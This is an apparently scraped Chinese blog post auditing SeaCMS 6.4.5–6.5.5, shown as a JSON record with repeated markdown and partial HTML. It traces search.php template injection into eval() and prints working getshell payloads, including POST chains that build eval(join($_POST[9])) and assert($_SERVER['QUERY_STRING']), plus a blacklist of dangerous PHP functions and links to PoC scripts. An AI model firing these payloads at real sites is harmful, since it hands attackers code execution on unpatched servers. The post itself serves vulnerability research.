：if:eval(join($_POST[9]))\n```\n\n\n\n因为每个传入的参数限长为 20，所以我们必须尽可能多的使用之后会在模板文件中进行替换的变量进行 payload 的构造。\n\n每一步都会将上一步构造的 payload 进行二次构造，最后传递成为最终等待执行的代码:\n\n```PHP\nif:eval(join($_POST[9]))\n```\n\n\n\n由上一个版本的数据流向，依旧会通过 **parseIf()** 函数，那么最终 eval() 执行恶意函数。这里有两个疑点需要解释。\n\n- 为了防止在 **parseIf** 里面的 eval() 中的 if 语句逻辑错误而不能正常执行，这里构造了 eval(eval(【】)）的结构，使得因为解析顺序，**$_POST** 传来的值会直接进行解释执行。\n\n- 这里只执行了一次 phpinfo() 函数就是第一次替换执行的，第一次的完整的正则匹配如下：\n\n  ```php\n  {if:eval(join($_POST[9]))},海洋CMS\" />\n  <meta name=\"description\" content=\"{if:eval(join($_POST[9]))},海洋CMS\" />\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n  //省略大部分内容\n  {end if}\n  ```\n\n  由正则匹配和 eval() 函数执行的语句知，最后的执行语句为\n\n  ```php\n  @eval(\"if(\"eval(join($_POST[9]))\"){\\$ifFlag=true;}else{\\$ifFlag=false;}\");\n  ```\n\n#### ￥思路分析\n\n如果我们在首次拿到这个系统的代码时，想要找到上面这种利用方式是不太容易的。整个利用思路最最值得借鉴的就是按照 php 的解析顺序，替换顺序来构造 payload ，让多次替换后的 payload 成为最终的 payload。的确骚~\n\n\n\n### 3、v6.5.5 前台 getshell\n\n这一版的系统在 parseIf 函数里面进行了危险函数,参数的过滤，但是忽略了 assert 和 $SERVER['QUERY_STRING']。构造方法同上一版，payload 如下。\n\n```php\n文件：\nsearch.php\n\nPOST 内容：\nsearchtype=5\n&searchword={if{searchpage:year}\n&year=:as{searchpage:area}}\n&area=s{searchpage:letter}\n&letter=ert{searchpage:lang}\n&yuyan=($_SE{searchpage:jq}\n&jq=RVER{searchpage:ver}\n&ver=[QUERY_STRING]));\n```\n\n访问如下的 url 即可触发\n\n`http://IP/search.php?phpinfo`\n\npost 内容如上。\n\n\n\n## 3@ 总结\n\n可以看见，这款 cms 的修复方法多次使用了黑名单，单独应用在这种场景下还是不容易做出良好的防御。\n\npoc 脚本链接如下：\n\n```\nv_6.4.5: https://github.com/59lx/auidt_poc/blob/master/seacms_poc_6.45_getshell.py\nv_6.5.4: https://github.com/59lx/auidt_poc/blob/master/seacms_poc_6.5_getshell.py\nv_6.5.5: https://github.com/59lx/auidt_poc/blob/master/seacms_poc_6.5_getshell.py\n```\n\n","source":"_posts/seacms_getshell篇.md","raw":"---\ntitle: seacms_getshell 篇\ntags:\n - 代码审计\n - php\ndate: 2019-08-17\n---\n\n\n\n\n\n## 1@ 前言\n\n换回我的 **小deepin了**，还是熟悉的味道，哈哈。配好所有之前的环境后，开始审计 ：）\n\n文章撰写时的审计环境：\n\n```\nserver : phpstudy\nsystem : win10\n```\n\n\n\n## 2@ seacms 各个版本的 getshell \n\n### 1. v_6.4.5 前台 getshell\n\n- 漏洞文件 **upload/search.php**\n\n我以为，初学审计的时候可以先看 payload，然后通过给出构造的参数形式了进行顺藤摸瓜。毕竟各大漏洞平台一般较不详细的时候也会给出几条简单的 poc_payload。我们先来看看这个版本的前台 getshell 的 payload。\n\n`http://IP/upload/search.php?searchtype=5&order=}{end if}{if:1)phpinfo();if(1}{end if}`\n\n#### 1.1 恶意 payload 的追踪\n\n​         首先，我们从上面的 payload 可以知晓可控参数为 **searchtype** 和 **order**，我们可以跟着 xdebug 完整的走一遍，较为清楚的了解漏洞存在的原因，和漏洞触发的条件（只列出漏洞相关的部分，相关逻辑功能的完成在这不细究）。\n\n```php\nrequire_once(\"include/common.php\");\nrequire_once(sea_INC.\"/main.class.php\");\n```\n\n文件开头包含了两个处理方法与处理参数的文件，其中 GPC 变量的传入的文件就包含在 **common.php**中。\n\n```php\nforeach(Array('_GET','_POST','_COOKIE') as $_request)\n{\n\tforeach($$_request as $_k => $_v) ${$_k} = _RunMagicQuotes($_v);\n}\n```\n\n这段 **common.php** 文件中的代码，将外部的 GPC 参数进行 php 代码层的赋值。\n\n\n\n再回到 **search.php**，来看看漏洞的直接关键点 **echoSearchpage()** 函数。\n\n```php\nglobal $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;\n$order = !empty($order)?$order:time;\n```\n\n函数开头将一些变量引用为全局变量，在函数内部使用。由第二句 order 变量的赋值，结合之前的外部变量赋值的方法，我们可以传入 order 参数进行变量覆盖。由 payload 可知，order字段里面是存在关键字眼 **phpinfo()**的，之后一定是经过了一系列的拼接和过滤，得到执行，我们在整个漏洞利用的在这条链里面就要紧盯着 order 参数的 `'成长历程'`。payload中的另一个参数是 searchtype ，赋值为5，所以我们跳转到代码的 65~76行。\n\n```php\nif(intval($searchtype)==5)\n\t{\n\t\t$searchTemplatePath = \"/templets/\".$GLOBALS['cfg_df_style'].\"/\".$GLOBALS['cfg_df_html'].\"/cascade.html\";\n\t\t$typeStr = !empty($tid)?intval($tid).'_':'0_';\n\t\t$yearStr = !empty($year)?PinYin($year).'_':'0_';\n\t\t$letterStr = !empty($letter)?$letter.'_':'0_';\n\t\t$areaStr = !empty($area)?PinYin($area).'_':'0_';\n\t\t$orderStr = !empty($order)?$order.'_':'0_';\n\t\t$jqStr = !empty($jq)?$jq.'_':'0_';\n\t\t$cacheName=\"parse_cascade_\".$typeStr.$yearStr.$letterStr.$areaStr.$orderStr; //构建cacheName\n\t\t$pSize = getPageSizeOnCache($searchTemplatePath,\"cascade\",\"\");  //获取输出页面大小\n```\n\n这段代码的大致意思是构造好模板文件的文件名，第一句得到构造模板文件的默认格式的文件名\n\n`/templets/default/html/cascade.html`\n\n然后开始拼接模板文件名，由于以上参数传入都为空，则由选择语句知道我们的最终文件名变量 $cacheName为:\n\n`parse_cascade_0_0_0_0_}{end if} {if:1)phpinfo();if(1}{end if}_`\n\n**psize** 是输出文件页面的大小，默认在缓存文件里面保存，值为24.\n\n由于其他相关参数都为空，我们直接跟进到文件的第 145 行，来查看模板文件的处理方式。\n\n```php\nif($cfg_iscache){\n\t\tif(chkFileCache($cacheName)){\n\t\t\t$content = getFileCache($cacheName);\n\t\t}else{\n\t\t\t$content = parseSearchPart($searchTemplatePath);\n\t\t\tsetFileCache($cacheName,$content);\n\t\t}\n\t}else{\n\t\t\t$content = parseSearchPart($searchTemplatePath);\n\t}\n```\n\n变量 $cfg_iscache 默认传入为 1，所以我们跟进到 **chkFileCache()**函数里面。\n\n- 文件 /upload/include/inc/common_func.php\n\n```php\nfunction chkFileCache($cacheName)\n{\n\tglobal $cfg_cachetime,$cfg_cachemark;\n\t$cacheFile=sea_ROOT.'/data/cache/'.$cfg_cachemark.$cacheName.'.inc';\n\t$mintime = time() - $cfg_cachetime*60;\n\tif(!file_exists($cacheFile) || ( file_exists($cacheFile) && ($mintime > filemtime($cacheFile)))){\n\t\treturn false;\n\t}else{\n\t\treturn true;\n\t}\n}\n```\n\n这里的逻辑理解的关键点就在这句\n\n`if(!file_exists($cacheFile) || ( file_exists($cacheFile) && ($mintime > filemtime($cacheFile))))`\n\n我们在这设一个 $test 变量 \n\n ![1564321031968](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/1.png)\n\n看到这里是返回 false 的，由格式来看，只能是两边的判断式都为假时，最终的布尔值才会为假。所以，file_exists($cacheFile) 是成立的，也就是说，文件`D:/WWW/seacms_v6.4/upload/data/cache/E20121213155816parse_cascade_0_0_0_0_}{end if} {if:1)phpinfo();if(1}{end if}_.inc` 存在。但实际上从本地来看，这个文件并不存在，只有一个相似的被截断的文件名 `E20121213155816parse_cascade_0_0_0_0_}{end if} {if` 存在，这是因为出现的 if 后面的冒号将文件名截断。但是 file_exists 函数仍然判断源文件存在。这想来是件很有趣的事情啊，这就引出来对 file_exists() 与 文件关系的讨论。\n\n#####  1.2.1 有趣的 file_exists()  和 ntfs 文件系统\n\n除了上面的那个情况外，还有一个点也能证明这个被截断文件名的文件是真实存在的。\n\n![1564363773307](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/2.png)\n\n \n\n思考一下：是否存在这种情况，操作系统的文件系统将文件写入的数据流保存到一个位置，但是显示的文件名是以它的命名规则显示，而真正的文件名是与写入数据流相互关联，可以用底层的编程语言打开那个完整文件名的文件，获取数据流？\n\n\n\n搜索无果后，在 p 神小密圈发问，得到了师傅们的指导，了解了一下 ntfs 文件系统。\n\n更多关于 ntfs 文件系统中的隐藏流的知识，请见我的另一篇博客：[ntfs 系统中的ADS供选数据流](https://www.59wlx.top/2019/08/17/ntfs%E7%B3%BB%E7%BB%9F%E4%B8%AD%E7%9A%84ADS%E4%BE%9B%E9%80%89%E6%95%B0%E6%8D%AE%E6%B5%81/)\n\n\n\n##### 1.2.2 继续跟踪审计\n\n好了，解决完上面的问题，我们接着来看审计。\n\n当我们第一次构造 payload 进行访问时，是不存在那个模板文件的，那么代码会走到另一个分支。\n\n\n\n```php\nif($cfg_iscache){\n\t\tif(chkFileCache($cacheName)){\n\t\t\t$content = getFileCache($cacheName);\n\t\t}else{\n\t\t\t$content = parseSearchPart($searchTemplatePath);\n\t\t\tsetFileCache($cacheName,$content);\n\t\t}\n\t}\n\n```\n\n\n\n在 chkFileCache() 函数返回 false 后，进入到 else 分支 ,执行获取 $content, 并对搜索的不存在模板文件进行写入。这也是我们之后访问那个模板文件中内容的由来，即可以一次或多次执行 phpinfo()。\n\n```php\nfunction parseSearchPart($templatePath)\n{\n\tglobal $mainClassObj,$tid;\n\t$currentTypeId = empty($tid)?0:$tid;\n\t$content=loadFile(sea_ROOT.$templatePath);\n\t$content=$mainClassObj->parseTopAndFoot($content);\n\t$content=$mainClassObj->parseAreaList($content);\n\t$content=$mainClassObj->parseHistory($content);\n\t$content=$mainClassObj->parseSelf($content);\n\t$content=$mainClassObj->parseGlobal($content);\n\t$content=$mainClassObj->parseMenuList($content,\"\",$currentTypeId);\n\t$content=$mainClassObj->parseVideoList($content,$currentTypeId);\n\t$content=$mainClassObj->parsenewsList($content,$currentTypeId);\n\t$content=$mainClassObj->parseTopicList($content);\n\treturn $content;\n}\n```\n\n这个函数获取模板文件的默认格式，然后进行替换赋值。\n\n之后就进入到了关键的模板内容替换的部分：\n\n\n\n```php\n$content = str_replace(\"{searchpage:page}\",$page,$content);\n\techo $content;\n\t$content = str_replace(\"{seacms:searchword}\",$searchword,$content);\n\t$content = str_replace(\"{seacms:searchnum}\",$TotalResult,$content);\n\t$content = str_replace(\"{searchpage:ordername}\",$order,$content);\n......\n```\n\n我只列出我们可控的部分，关键就在 $order 这个参数，我们结合 $content 获取到的模板文件的内容，来观察替换后的亚子。模板内容如下：\n\n```html\n      <a href=\"{searchpage:order-time-link}\" {if:\"{searchpage:ordername}\"==\"time\"} class=\"btn btn-success\" {else} class=\"btn btn-default\" {end if} id=\"orderhits\">最新上映</a>\n      <a href=\"{searchpage:order-hit-link}\" {if:\"{searchpage:ordername}\"==\"hit\"} class=\"btn btn-success\" {else} class=\"btn btn-default\" {end if} id=\"orderaddtime\">最近热播</a>\n      <a href=\"{searchpage:order-score-link}\" {if:\"{searchpage:ordername}\"==\"score\"} class=\"btn btn-success\" {else} class=\"btn btn-default\" {end if} id=\"ordergold\">评分最高</a>\n \n```\n\n可以看到，模板文件中有3次出现 ordername，这也就可以解释为什么 payload 触发漏洞之后，执行了三次 phpifno()\n\n结合我们的 payload，我们可以知道模板文件替换位置最终的形式如下：\n\n```html\n<a href=\"{searchpage:order-time-link}\" {if:\"}{end if}{if:1)phpinfo();if(1}{end if}\"==\"time\"} class=\"btn btn-success\" {else} class=\"btn btn-default\" {end if} id=\"orderhits\">\n```\n\n这里的 `}`,作用就是在 eval 的时候保证逻辑与语法的正确性，保证之后的代码可以被正确执行。\n\n模板文件内容替换后，进入到最最关键的一步：\n\n`$content=$mainClassObj->parseIf($content);`\n\n跟进到 parseIf 函数：\n\n```php\nfunction parseIf($content){\n\t\tif (strpos($content,'{if:')=== false){\n\t\treturn $content;\n\t\t}else{\n\t\t// echo $content;\n\t\t$labelRule = buildregx(\"{if:(.*?)}(.*?){end if}\",\"is\");\n\t\t$labelRule2=\"{elseif\";\n\t\t$labelRule3=\"{else}\";\n\t\tpreg_match_all($labelRule,$content,$iar);\n\t\t$arlen=count($iar[0]);\n\t\t// var_dump($iar[0]);\n\t\t$elseIfFlag=false;\n\t\tfor($m=0;$m<$arlen;$m++){\n\t\t\t$strIf=$iar[1][$m];\n\t\t\t$strIf=$this->parseStrIf($strIf);\n\t\t\t$strThen=$iar[2][$m];\n\t\t\t$strThen=$this->parseSubIf($strThen);\n\t\t\tif (strpos($strThen,$labelRule2)===false){\n\t\t\t\tif (strpos($strThen,$labelRule3)>=0){\n\t\t\t\t\t$elsearray=explode($labelRule3,$strThen);\n\t\t\t\t\t$strThen1=$elsearray[0];\n\t\t\t\t\t$strElse1=$elsearray[1];\n\t\t\t\t\t@eval(\"if(\".$strIf.\"){\\$ifFlag=true;}else{\\$ifFlag=false;}\");\n```\n\n由正则式可知 $iar[0] 数组得到的是所有满足 `{if:【内容】}【内容】{end if}` 这种形式的匹配结果\n\n回头来看看我们刚刚替换后的关键部分的模板内容：\n\n`<a href=\"{searchpage:order-time-link}\" {if:\"}{end if}{if:1)phpinfo();if(1}{end if}\"==\"time\"}`\n\n是满足匹配规则的，重要内容保存在 $iar[1]中。这里我们直接定位到最终执行 payload 的语句中。\n\n`@eval(\"if(\".$strIf.\"){\\$ifFlag=true;}else{\\$ifFlag=false;}\");`\n\n跟踪 $strIf 变量，经过了两次处理\n\n```php\n$strIf=$iar[1][$m];\n$strIf=$this->parseStrIf($strIf);\n```\n\n上面说过，最终的 payload 关键内容会保存在 $iar[1] 中，所以经过 for 遍历，$strIf 一定可以被赋值为带有 phpinfo() 的字符串。\n\n跟进到 parseStrIf() 函数。\n\n```php\n\tfunction parseStrIf($strIf)\n\t{\n\t\tif(strpos($strIf,'=')===false)\n\t\t{\n\t\t\treturn $strIf;\n\t\t}\n\t\tif((strpos($strIf,'==')===false)&&(strpos($strIf,'=')>0))\n\t\t{\n\t\t\t$strIf=str_replace('=', '==', $strIf);\n\t\t}\n\t\t$strIfArr =  explode('==',$strIf);\n\t\treturn (empty($strIfArr[0])?'NULL':$strIfArr[0]).\"==\".(empty($strIfArr[1])?'NULL':$strIfArr[1]);\n\t}\n```\n\n当下我们的 $strIf 为 `1)phpinfo();if(1`\n\n其中没有 **=** ，所以直接返回原内容。所以最后 eval() 函数执行的内容就为\n\n`@eval(\"if(1)phpinfo();if(1){\\$ifFlag=true;}else{\\$ifFlag=false;}\");`\n\n代码就会顺利得到执行。\n\n这里纠正一下引用文章的一个说法，`$labelRule = buildregx(\"{if:(.*?)}(.*?){end if}\",\"is\");`\n\n这个正则式并不是贪婪匹配，而是使用  **？** 来取消了贪婪匹配。每次只匹配一个结果，并不向后延伸，而匹配到所有结果是函数 **preg_match_all()** 的作用。\n\n#### 1.2 结果分析\n\n这个漏洞利用的十分巧妙。先利用可控变量替换模板中的内容，然后进行模板内容提取，最后正则匹配执行代码。但是说到底，挖掘漏洞的人肯定也是从 eval() 这个危险函数出发，逐步回退，找到可控参数，然后一步步的构造payload，这是典型的一个白盒挖掘漏洞的思路，`回溯参数`的方法。\n\n但是 php7 版本以上此漏洞却不能利用，原因是之前匹配到的 `\"` 使得 eval() 函数不能正确执行，导致后面的代码停止执行。\n\n测试代码如下：\n\n```php\n<?php\n$test = array(1,2,3,'\"',\"1)phpinfo();if(1\");\nfor ($i=0;$i<5;$i++){\n    @eval(\"if(\".$test[$i].\") { \\$ifFlag=true;} else{ \\$ifFlag=false;}\");\n}\n?>\n```\n\nphp5 下的执行结果\n\n  ![](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/4.png)\n\nphp7 下的执行结果\n\n ![](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/5.png)\n\n可以看出，单从 eval() 函数的使用上来说，php7 对于语法的正确性要求更加严格。\n\n\n\n### 2、v_6.5.4 前台 getshell\n\n在这个版本的代码中，将上面讲到的 **$order** 变量也进行了特殊字符的检测 \n\n ![6](https://raw.githubusercontent.com/59lx/userful_photo/master/myblog_photos/seacms_getshell/6.png)\n\n\n\n跟进到 RemoveXSS 函数里面，可以看出是一个基于黑名单的 xss 关键字过滤的方法。\n\n```php\nfunction RemoveXSS($val) {  \n\n   $val = preg_replace('/([\\x00-\\x08,\\x0b-\\x0c,\\x0e-\\x19])/', '', $val);  \n  \n   $search = 'abcdefghijklmnopqrstuvwxyz'; \n   $search .= 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';  \n   $search .= '1234567890!@#$%^&*()'; \n   $search .= '~`\";:?+/={}[]-_|\\'\\\\'; \n   for ($i = 0; $i < strlen($search); $i++) { \n \n      $val = preg_replace('/(&#[xX]0{0,8}'.dechex(ord($search[$i])).';?)/i', $search[$i], $val); \n      $val = preg_replace('/(&#0{0,8}'.ord($search[$i]).';?)/', $search[$i], $val); // with a ; \n   } \n   \n   $ra1 = Array('_GET','_POST','_COOKIE','_REQUEST','if:','javascript', 'vbscript', 'expression', 'applet', 'meta', 'xml', 'blink', 'link', 'style', 'script', 'embed', 'object', 'iframe', 'frame', 'frameset', 'ilayer', 'layer', 'bgsound', 'title', 'base', 'eval', 'passthru', 'exec', 'assert', 'system', 'chroot', 'chgrp', 'chown', 'shell_exec', 'proc_open', 'ini_restore', 'dl', 'readlink', 'symlink', 'popen', 'stream_socket_server', 'pfsockopen', 'putenv', 'cmd','base64_decode','fopen','fputs','replace','input','contents'); \n   $ra2 = Array('onabort', 'onactivate', 'onafterprint', 'onafterupdate', 'onbeforeactivate', 'onbeforecopy', 'onbeforecut', 'onbeforedeactivate', 'onbeforeeditfocus', 'onbeforepaste', 'onbeforeprint', 'onbeforeunload', 'onbeforeupdate', 'onblur', 'onbounce', 'oncellchange', 'onchange', 'onclick', 'oncontextmenu', 'oncontrolselect', 'oncopy', 'oncut', 'ondataavailable', 'ondatasetchanged', 'ondatasetcomplete', 'ondblclick', 'ondeactivate', 'ondrag', 'ondragend', 'ondragenter', 'ondragleave', 'ondragover', 'ondragstart', 'ondrop', 'onerror', 'onerrorupdate', 'onfilterchange', 'onfinish', 'onfocus', 'onfocusin', 'onfocusout', 'onhelp', 'onkeydown', 'onkeypress', 'onkeyup', 'onlayoutcomplete', 'onload', 'onlosecapture', 'onmousedown', 'onmouseenter', 'onmouseleave', 'onmousemove', 'onmouseout', 'onmouseover', 'onmouseup', 'onmousewheel', 'onmove', 'onmoveend', 'onmovestart', 'onpaste', 'onpropertychange', 'onreadystatechange', 'onreset', 'onresize', 'onresizeend', 'onresizestart', 'onrowenter', 'onrowexit', 'onrowsdelete', 'onrowsinserted', 'onscroll', 'onselect', 'onselectionchange', 'onselectstart', 'onstart', 'onstop', 'onsubmit', 'onunload'); \n   $ra = array_merge($ra1, $ra2); \n\n    ......\n    \n   return $val;  \n}   \n```\n\n其中，黑名单数组的第一组 $ra1 中的第5项添加了 `if:` 这个黑名单匹配项，还加了另外其他的几个匹配项\n\n```\n'_GET','_POST','_COOKIE','_REQUEST'\n```\n\n所以 v_6.4.5 版本的 payload 会因为逻辑关系的不成立，因此在 eval() 函数中得不到执行。\n\n\n\n那么我们来看看这个版本的脑洞版 payload \n\n```php\n文件：\nsearch.php\n\nPOST 内容：\nsearchtype=5\n&searchword={if{searchpage:year}\n&year=:e{searchpage:area}}\n&area=v{searchpage:letter}\n&letter=al{searchpage:lang}\n&yuyan=(join{searchpage:jq}\n&jq=($_P{searchpage:ver}\n&ver=OST[9]))\n&9[]=ph\n&9[]=pinfo();\n\n// 传递拼接为 ：if:eval(join($_POST[9]))\n```\n\n\n\n因为每个传入的参数限长为 20，所以我们必须尽可能多的使用之后会在模板文件中进行替换的变量进行 payload 的构造。\n\n每一步都会将上一步构造的 payload 进行二次构造，最后传递成为最终等待执行的代码:\n\n```PHP\nif:eval(join($_POST[9]))\n```\n\n\n\n由上一个版本的数据流向，依旧会通过 **parseIf()** 函数，那么最终 eval() 执行恶意函数。这里有两个疑点需要解释。\n\n- 为了防止在 **parseIf** 里面的 eval() 中的 if 语句逻辑错误而不能正常执行，这里构造了 eval(eval(【】)）的结构，使得因为解析顺序，**$_POST** 传来的值会直接进行解释执行。\n\n- 这里只执行了一次 phpinfo() 函数就是第一次替换执行的，第一次的完整的正则匹配如下：\n\n  ```php\n  {if:eval(join($_POST[9]))},海洋CMS\" />\n  <meta name=\"description\" content=\"{if:eval(join($_POST[9]))},海洋CMS\" />\n  <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\">\n  //省略大部分内容\n  {end if}\n  ```\n\n  由正则匹配和 eval() 函数执行的语句知，最后的执行语句为\n\n  ```php\n  @eval(\"if(\"eval(join($_POST[9]))\"){\\$ifFlag=true;}else{\\$ifFlag=false;}\");\n  ```\n\n#### ￥思路分析\n\n如果我们在首次拿到这个系统的代码时，想要找到上面这种利用方式是不太容易的。整个利用思路最最值得借鉴的就是按照 php 的解析顺序，替换顺序来构造 payload ，让多次替换后的 payload 成为最终的 payload。的确骚~\n\n\n\n### 3、v6.5.5 前台 getshell\n\n这一版的系统在 parseIf 函数里面进行了危险函数,参数的过滤，但是忽略了 assert 和 $SERVER['QUERY_STRING']。构造方法同上一版，payload 如下。\n\n```php\n文件：\nsearch.php\n\nPOST 内容：\nsearchtype=5\n&searchword={if{searchpage:year}\n&year=:as{searchpage:area}}\n&area=s{searchpage:letter}\n&letter=ert{searchpage:lang}\n&yuyan=($_SE{searchpage:jq}\n&jq=RVER{searchpage:ver}\n&ver=[QUERY_STRING]));\n```\n\n访问如下的 url 即可触发\n\n`http://IP/search.php?phpinfo`\n\npost 内容如上。\n\n\n\n## 3@ 总结\n\n可以看见，这款 cms 的修复方法多次使用了黑名单，单独应用在这种场景下还是不容易做出良好的防御。\n\npoc 脚本链接如下：\n\n```\nv_6.4.5: https://github.com/59lx/auidt_poc/blob/master/seacms_poc_6.45_getshell.py\nv_6.5.4: https://github.com/59lx/auidt_poc/blob/master/seacms_poc_6.5_getshell.py\nv_6.5.5: https://github.com/59lx/auidt_poc/blob/master/seacms_poc_6.5_getshell.py\n```\n\n","slug":"seacms_getshell篇","published":1,"updated":"2019-08-31T07:48:54.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckbh7yzgj0007mp7gdkhqt744","content":"<h2 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1@ 前言\"></a>1@ 前言</h2><p>换回我的 <strong>小deepin了</strong>，还是熟悉的味道，哈哈。配好所有之前的环境后，开始审计 ：）</p>\n<p>文章撰写时的审计环境：</p>\n<figure class=\"highlight routeros\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs undefined\">server : phpstudy<span class=\"hljs-built_in\"><br>system </span>: win10<br></code></pre></td></tr></table></figure>\n\n<h2 id=\"2-seacms-各个版本的-getshell\"><a href=\"#2-seacms-各个版本的-getshell\" class=\"headerlink\" title=\"2@ seacms 各个版本的 getshell\"></a>2@ seacms 各个版本的 getshell</h2><h3 id=\"1-v-6-4-5-前台-getshell\"><a href=\"#1-v-6-4-5-前台-getshell\" class=\"headerlink\" title=\"1. v_6.4.5 前台 getshell\"></a>1. v_6.4.5 前台 getshell</h3><ul>\n<li>漏洞文件 <strong>upload/search.php</strong></li>\n</ul>\n<p>我以为，初学审计的时候可以先看 payload，然后通过给出构造的参数形式了进行顺藤摸瓜。毕竟各大漏洞平台一般较不详细的时候也会给出几条简单的 poc_payload。我们先来看看这个版本的前台 getshell 的 payload。</p>\n<p><code>http://IP/upload/search.php?searchtype=5&amp;order=}{end if}{if:1)phpinfo();if(1}{end if}</code></p>\n<h4 id=\"1-1-恶意-payload-的追踪\"><a href=\"#1-1-恶意-payload-的追踪\" class=\"headerlink\" title=\"1.1 恶意 payload 的追踪\"></a>1.1 恶意 payload 的追踪</h4><p>​         首先，我们从上面的 payload 可以知晓可控参数为 <strong>searchtype</strong> 和 <strong>order</strong>，我们可以跟着 xdebug 完整的走一遍，较为清楚的了解漏洞存在的原因，和漏洞触发的条件（只列出漏洞相关的部分，相关逻辑功能的完成在这不细究）。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">require_once</span>(<span class=\"hljs-string\">\"include/common.php\"</span>);<br><span class=\"hljs-keyword\">require_once</span>(sea_INC.<span class=\"hljs-string\">\"/main.class.php\"</span>);<br></code></pre></td></tr></table></figure>\n\n<p>文件开头包含了两个处理方法与处理参数的文件，其中 GPC 变量的传入的文件就包含在 <strong>common.php</strong>中。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">foreach</span>(<span class=\"hljs-keyword\">Array</span>(<span class=\"hljs-string\">'_GET'</span>,<span class=\"hljs-string\">'_POST'</span>,<span class=\"hljs-string\">'_COOKIE'</span>) <span class=\"hljs-keyword\">as</span> $_request)<br>&#123;<br>\t<span class=\"hljs-keyword\">foreach</span>($$_request <span class=\"hljs-keyword\">as</span> $_k =&gt; $_v) $&#123;$_k&#125; = _RunMagicQuotes($_v);<br>&#125;<br></code></pre></td></tr></table></figure>\n\n<p>这段 <strong>common.php</strong> 文件中的代码，将外部的 GPC 参数进行 php 代码层的赋值。</p>\n<p>再回到 <strong>search.php</strong>，来看看漏洞的直接关键点 <strong>echoSearchpage()</strong> 函数。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">global</span> $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost;<br>$order = !<span class=\"hljs-keyword\">empty</span>($order)?$order:time;<br></code></pre></td></tr></table></figure>\n\n<p>函数开头将一些变量引用为全局变量，在函数内部使用。由第二句 order 变量的赋值，结合之前的外部变量赋值的方法，我们可以传入 order 参数进行变量覆盖。由 payload 可知，order字段里面是存在关键字眼 <strong>phpinfo()</strong>的，之后一定是经过了一系列的拼接和过滤，得到执行，我们在整个漏洞利用的在这条链里面就要紧盯着 order 参数的 <code>&#39;成长历程&#39;</code>。payload中的另一个参数是 searchtype ，赋值为5，所以我们跳转到代码的 65~76行。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs php\"><span class=\"hljs-keyword\">if</span>(intval($searchtype)==<span class=\"hljs-number\">5</span>)<br>\t&#123;<br>\t\t$searchTemplatePath = <span class=\"hljs-string\">\"/templets/\"</span>.$GLOBALS[<span class=\"hljs-string\">'cfg_df_style'</span>].<span class=\"hljs-string\">\"/\"</span>.$GLOBALS[<span class=\"hljs-string\">'cfg_df_html'</span>].<span class=\"hljs-string\">\"/cascade.html\"</span>;<br>\t\t$typeStr = !<span class=\"hljs-keyword\">empty</span>($tid)?intval($tid).<span class=\"hljs-string\">'_'</span>:<span class=\"hljs-string\">'0_'</span>;<br>\t\t$yearStr = !<span class=\"hljs-keyword\">empty</span>($year)?PinYin($year).<span class=\"hljs-string\">'_'</span>:<span class=\"hljs-string\">'0_'</span>;<br>\t\t$letterStr = !<span class=\"hljs-keyword\">empty</span>($letter)?$letter.<span class=\"hljs-string\">'_'</span>:<span class=\"hljs-string\">'0_'</span>;<br>\t\t$areaStr = !<span class=\"hljs-keyword\">empty</span>($area)?PinYin($area).<span class=\"hljs-string\">'_'</span>:<span class=\"hljs-string\">'0_'</span>;<br>\t\t$orderStr = !<span class=\"hljs-keyword\">empty</span>($order)?$order.<span class=\"hljs-string\">'_'</span>:<span class=\"hljs-string\">'0_'</span>;<br>\t\t$jqStr = !<span class=\"hljs-keyword\">empty</span>($jq)?$jq.<span class=\"hljs-string\">'_'</span>:<span class=\"hljs-string\">'0_'</span>;<br>\t\t$cacheName=<span class=\"hljs-string\">\"parse_cascade_\"</span>.$typeStr.$yearStr.$letterStr.$areaStr.$orderStr; <span class=\"hljs-comment\">//构建cacheName</span><br>\t\t$pSize = getPageSizeOnCache($searchTemplatePath,<span class=\"hljs-string\">\"cascade\"</span>,<span class=\"hljs-string\">\"\"</span>);  <span class=\"hljs-comment\">//获取输出页面大小</span><br></code></pre></td></tr></table></figure>\n\n<p>这段代码的大致意思是构造好模板文件的文件名，第一句得到构造模板文件的默认格式的文件名</p>\n<p><code>/templets/default/html/cascade.html</code></p>\n<p>然后开始拼接模板文件名，由于以上参数传入都为空，则由选择语句知道我们的最终文件名变量 $cacheName为:</p>\n<p><code>parse_cascade_0_0_0_0_}{end if} {if:1)phpinfo();if(1}{end if}_</code></p>\n<p><strong>psize</strong> 